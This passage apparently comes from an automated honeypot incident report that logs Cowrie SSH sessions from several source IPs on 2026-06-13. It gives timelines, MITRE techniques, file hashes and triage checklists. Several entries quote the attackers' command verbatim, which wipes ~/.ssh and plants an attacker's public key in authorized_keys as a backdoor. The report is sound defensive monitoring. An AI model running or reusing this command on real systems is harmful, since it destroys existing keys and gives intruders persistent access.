| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:46:10` | `cowrie.session.connect` |
| `2026-06-13 07:46:10` | `cowrie.client.version` |
| `2026-06-13 07:46:11` | `cowrie.client.kex` |
| `2026-06-13 07:46:12` | `cowrie.login.success` |
| `2026-06-13 07:46:12` | `cowrie.session.params` |
| `2026-06-13 07:46:12` | `cowrie.command.input` |
| `2026-06-13 07:46:12` | `cowrie.command.failed` |
| `2026-06-13 07:46:13` | `cowrie.log.closed` |
| `2026-06-13 07:46:13` | `cowrie.session.params` |
| `2026-06-13 07:46:13` | `cowrie.command.input` |
| `2026-06-13 07:46:13` | `cowrie.session.file_download` |
| `2026-06-13 07:46:13` | `cowrie.log.closed` |
| `2026-06-13 07:46:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.214.209[.]153` to AbuseIPDB if not already reported
- [ ] Block `172.214.209[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfd7b347f3e7

| Field | Detail |
|---|---|
| **Source IP** | `172.214.209[.]153` |
| **First Seen** | 2026-06-13 07:46 |
| **Last Seen** | 2026-06-13 07:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:46:16` | `cowrie.session.connect` |
| `2026-06-13 07:46:16` | `cowrie.client.version` |
| `2026-06-13 07:46:16` | `cowrie.client.kex` |
| `2026-06-13 07:46:17` | `cowrie.login.success` |
| `2026-06-13 07:46:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.214.209[.]153` to AbuseIPDB if not already reported
- [ ] Block `172.214.209[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00c3c918e4a3

| Field | Detail |
|---|---|
| **Source IP** | `172.214.209[.]153` |
| **First Seen** | 2026-06-13 07:48 |
| **Last Seen** | 2026-06-13 07:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:48:10` | `cowrie.session.connect` |
| `2026-06-13 07:48:10` | `cowrie.client.version` |
| `2026-06-13 07:48:11` | `cowrie.client.kex` |
| `2026-06-13 07:48:11` | `cowrie.login.success` |
| `2026-06-13 07:48:12` | `cowrie.session.params` |
| `2026-06-13 07:48:12` | `cowrie.command.input` |
| `2026-06-13 07:48:12` | `cowrie.command.failed` |
| `2026-06-13 07:48:12` | `cowrie.log.closed` |
| `2026-06-13 07:48:13` | `cowrie.session.params` |
| `2026-06-13 07:48:13` | `cowrie.command.input` |
| `2026-06-13 07:48:13` | `cowrie.session.file_download` |
| `2026-06-13 07:48:13` | `cowrie.log.closed` |
| `2026-06-13 07:48:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.214.209[.]153` to AbuseIPDB if not already reported
- [ ] Block `172.214.209[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d34491dfb162

| Field | Detail |
|---|---|
| **Source IP** | `172.214.209[.]153` |
| **First Seen** | 2026-06-13 07:48 |
| **Last Seen** | 2026-06-13 07:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:48:16` | `cowrie.session.connect` |
| `2026-06-13 07:48:16` | `cowrie.client.version` |
| `2026-06-13 07:48:16` | `cowrie.client.kex` |
| `2026-06-13 07:48:17` | `cowrie.login.success` |
| `2026-06-13 07:48:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.214.209[.]153` to AbuseIPDB if not already reported
- [ ] Block `172.214.209[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e48dade7510

| Field | Detail |
|---|---|
| **Source IP** | `172.214.209[.]153` |
| **First Seen** | 2026-06-13 07:54 |
| **Last Seen** | 2026-06-13 07:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:54:14` | `cowrie.session.connect` |
| `2026-06-13 07:54:14` | `cowrie.client.version` |
| `2026-06-13 07:54:15` | `cowrie.client.kex` |
| `2026-06-13 07:54:15` | `cowrie.login.success` |
| `2026-06-13 07:54:16` | `cowrie.session.params` |
| `2026-06-13 07:54:16` | `cowrie.command.input` |
| `2026-06-13 07:54:16` | `cowrie.command.failed` |
| `2026-06-13 07:54:16` | `cowrie.log.closed` |
| `2026-06-13 07:54:17` | `cowrie.session.params` |
| `2026-06-13 07:54:17` | `cowrie.command.input` |
| `2026-06-13 07:54:17` | `cowrie.session.file_download` |
| `2026-06-13 07:54:17` | `cowrie.log.closed` |
| `2026-06-13 07:54:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.214.209[.]153` to AbuseIPDB if not already reported
- [ ] Block `172.214.209[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04700d2e3481

| Field | Detail |
|---|---|
| **Source IP** | `50.6.228[.]111` |
| **First Seen** | 2026-06-13 07:54 |
| **Last Seen** | 2026-06-13 07:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:54:18` | `cowrie.session.connect` |
| `2026-06-13 07:54:18` | `cowrie.client.version` |
| `2026-06-13 07:54:18` | `cowrie.client.kex` |
| `2026-06-13 07:54:19` | `cowrie.login.success` |
| `2026-06-13 07:54:19` | `cowrie.session.params` |
| `2026-06-13 07:54:19` | `cowrie.command.input` |
| `2026-06-13 07:54:19` | `cowrie.command.failed` |
| `2026-06-13 07:54:20` | `cowrie.log.closed` |
| `2026-06-13 07:54:20` | `cowrie.session.params` |
| `2026-06-13 07:54:20` | `cowrie.command.input` |
| `2026-06-13 07:54:20` | `cowrie.session.file_download` |
| `2026-06-13 07:54:20` | `cowrie.log.closed` |
| `2026-06-13 07:54:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.228[.]111` to AbuseIPDB if not already reported
- [ ] Block `50.6.228[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1194fd768e30

| Field | Detail |
|---|---|
| **Source IP** | `172.214.209[.]153` |
| **First Seen** | 2026-06-13 07:54 |
| **Last Seen** | 2026-06-13 07:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:54:20` | `cowrie.session.connect` |
| `2026-06-13 07:54:20` | `cowrie.client.version` |
| `2026-06-13 07:54:20` | `cowrie.client.kex` |
| `2026-06-13 07:54:21` | `cowrie.login.success` |
| `2026-06-13 07:54:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.214.209[.]153` to AbuseIPDB if not already reported
- [ ] Block `172.214.209[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3eaed1f1417d

| Field | Detail |
|---|---|
| **Source IP** | `50.6.228[.]111` |
| **First Seen** | 2026-06-13 07:54 |
| **Last Seen** | 2026-06-13 07:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:54:24` | `cowrie.session.connect` |
| `2026-06-13 07:54:24` | `cowrie.client.version` |
| `2026-06-13 07:54:24` | `cowrie.client.kex` |
| `2026-06-13 07:54:25` | `cowrie.login.success` |
| `2026-06-13 07:54:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.228[.]111` to AbuseIPDB if not already reported
- [ ] Block `50.6.228[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80d2acc5c256

| Field | Detail |
|---|---|
| **Source IP** | `50.6.228[.]111` |
| **First Seen** | 2026-06-13 07:56 |
| **Last Seen** | 2026-06-13 07:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:56:03` | `cowrie.session.connect` |
| `2026-06-13 07:56:03` | `cowrie.client.version` |
| `2026-06-13 07:56:04` | `cowrie.client.kex` |
| `2026-06-13 07:56:05` | `cowrie.login.success` |
| `2026-06-13 07:56:05` | `cowrie.session.params` |
| `2026-06-13 07:56:05` | `cowrie.command.input` |
| `2026-06-13 07:56:05` | `cowrie.command.failed` |
| `2026-06-13 07:56:06` | `cowrie.log.closed` |
| `2026-06-13 07:56:06` | `cowrie.session.params` |
| `2026-06-13 07:56:06` | `cowrie.command.input` |
| `2026-06-13 07:56:06` | `cowrie.session.file_download` |
| `2026-06-13 07:56:06` | `cowrie.log.closed` |
| `2026-06-13 07:56:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.228[.]111` to AbuseIPDB if not already reported
- [ ] Block `50.6.228[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c166282a897

| Field | Detail |
|---|---|
| **Source IP** | `50.6.228[.]111` |
| **First Seen** | 2026-06-13 07:56 |
| **Last Seen** | 2026-06-13 07:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:56:09` | `cowrie.session.connect` |
| `2026-06-13 07:56:09` | `cowrie.client.version` |
| `2026-06-13 07:56:10` | `cowrie.client.kex` |
| `2026-06-13 07:56:11` | `cowrie.login.success` |
| `2026-06-13 07:56:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.228[.]111` to AbuseIPDB if not already reported
- [ ] Block `50.6.228[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00896d8ff150

| Field | Detail |
|---|---|
| **Source IP** | `102.221.30[.]186` |
| **First Seen** | 2026-06-13 07:58 |
| **Last Seen** | 2026-06-13 07:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:58:56` | `cowrie.session.connect` |
| `2026-06-13 07:58:56` | `cowrie.client.version` |
| `2026-06-13 07:58:56` | `cowrie.client.kex` |
| `2026-06-13 07:58:57` | `cowrie.login.success` |
| `2026-06-13 07:58:58` | `cowrie.session.params` |
| `2026-06-13 07:58:58` | `cowrie.command.input` |
| `2026-06-13 07:58:58` | `cowrie.command.failed` |
| `2026-06-13 07:58:58` | `cowrie.log.closed` |
| `2026-06-13 07:58:59` | `cowrie.session.params` |
| `2026-06-13 07:58:59` | `cowrie.command.input` |
| `2026-06-13 07:58:59` | `cowrie.session.file_download` |
| `2026-06-13 07:58:59` | `cowrie.log.closed` |
| `2026-06-13 07:59:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.221.30[.]186` to AbuseIPDB if not already reported
- [ ] Block `102.221.30[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4794a96f4f5b

| Field | Detail |
|---|---|
| **Source IP** | `102.221.30[.]186` |
| **First Seen** | 2026-06-13 07:59 |
| **Last Seen** | 2026-06-13 07:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 07:59:02` | `cowrie.session.connect` |
| `2026-06-13 07:59:02` | `cowrie.client.version` |
| `2026-06-13 07:59:02` | `cowrie.client.kex` |
| `2026-06-13 07:59:03` | `cowrie.login.success` |
| `2026-06-13 07:59:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.221.30[.]186` to AbuseIPDB if not already reported
- [ ] Block `102.221.30[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3488155f68f5

| Field | Detail |
|---|---|
| **Source IP** | `50.6.228[.]111` |
| **First Seen** | 2026-06-13 08:02 |
| **Last Seen** | 2026-06-13 08:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:02:52` | `cowrie.session.connect` |
| `2026-06-13 08:02:52` | `cowrie.client.version` |
| `2026-06-13 08:02:53` | `cowrie.client.kex` |
| `2026-06-13 08:02:54` | `cowrie.login.success` |
| `2026-06-13 08:02:54` | `cowrie.session.params` |
| `2026-06-13 08:02:54` | `cowrie.command.input` |
| `2026-06-13 08:02:54` | `cowrie.command.failed` |
| `2026-06-13 08:02:55` | `cowrie.log.closed` |
| `2026-06-13 08:02:55` | `cowrie.session.params` |
| `2026-06-13 08:02:55` | `cowrie.command.input` |
| `2026-06-13 08:02:55` | `cowrie.session.file_download` |
| `2026-06-13 08:02:55` | `cowrie.log.closed` |
| `2026-06-13 08:03:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.228[.]111` to AbuseIPDB if not already reported
- [ ] Block `50.6.228[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ac7a76df22b

| Field | Detail |
|---|---|
| **Source IP** | `50.6.228[.]111` |
| **First Seen** | 2026-06-13 08:02 |
| **Last Seen** | 2026-06-13 08:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:02:58` | `cowrie.session.connect` |
| `2026-06-13 08:02:58` | `cowrie.client.version` |
| `2026-06-13 08:02:59` | `cowrie.client.kex` |
| `2026-06-13 08:03:00` | `cowrie.login.success` |
| `2026-06-13 08:03:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.228[.]111` to AbuseIPDB if not already reported
- [ ] Block `50.6.228[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc6fb94f1de6

| Field | Detail |
|---|---|
| **Source IP** | `101.47.158[.]56` |
| **First Seen** | 2026-06-13 08:04 |
| **Last Seen** | 2026-06-13 08:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:04:11` | `cowrie.session.connect` |
| `2026-06-13 08:04:11` | `cowrie.client.version` |
| `2026-06-13 08:04:11` | `cowrie.client.kex` |
| `2026-06-13 08:04:11` | `cowrie.login.success` |
| `2026-06-13 08:04:12` | `cowrie.session.params` |
| `2026-06-13 08:04:12` | `cowrie.command.input` |
| `2026-06-13 08:04:12` | `cowrie.command.failed` |
| `2026-06-13 08:04:12` | `cowrie.log.closed` |
| `2026-06-13 08:04:12` | `cowrie.session.params` |
| `2026-06-13 08:04:12` | `cowrie.command.input` |
| `2026-06-13 08:04:12` | `cowrie.session.file_download` |
| `2026-06-13 08:04:12` | `cowrie.log.closed` |
| `2026-06-13 08:04:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.158[.]56` to AbuseIPDB if not already reported
- [ ] Block `101.47.158[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44e4150e58c1

| Field | Detail |
|---|---|
| **Source IP** | `101.47.158[.]56` |
| **First Seen** | 2026-06-13 08:04 |
| **Last Seen** | 2026-06-13 08:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:04:13` | `cowrie.session.connect` |
| `2026-06-13 08:04:13` | `cowrie.client.version` |
| `2026-06-13 08:04:13` | `cowrie.client.kex` |
| `2026-06-13 08:04:14` | `cowrie.login.success` |
| `2026-06-13 08:04:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.158[.]56` to AbuseIPDB if not already reported
- [ ] Block `101.47.158[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32f5ed993a20

| Field | Detail |
|---|---|
| **Source IP** | `154.83.13[.]181` |
| **First Seen** | 2026-06-13 08:06 |
| **Last Seen** | 2026-06-13 08:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:06:13` | `cowrie.session.connect` |
| `2026-06-13 08:06:13` | `cowrie.client.version` |
| `2026-06-13 08:06:13` | `cowrie.client.kex` |
| `2026-06-13 08:06:13` | `cowrie.login.success` |
| `2026-06-13 08:06:13` | `cowrie.session.params` |
| `2026-06-13 08:06:13` | `cowrie.command.input` |
| `2026-06-13 08:06:13` | `cowrie.command.failed` |
| `2026-06-13 08:06:13` | `cowrie.log.closed` |
| `2026-06-13 08:06:14` | `cowrie.session.params` |
| `2026-06-13 08:06:14` | `cowrie.command.input` |
| `2026-06-13 08:06:14` | `cowrie.session.file_download` |
| `2026-06-13 08:06:14` | `cowrie.log.closed` |
| `2026-06-13 08:06:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.83.13[.]181` to AbuseIPDB if not already reported
- [ ] Block `154.83.13[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-722772ff675d

| Field | Detail |
|---|---|
| **Source IP** | `154.83.13[.]181` |
| **First Seen** | 2026-06-13 08:06 |
| **Last Seen** | 2026-06-13 08:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:06:16` | `cowrie.session.connect` |
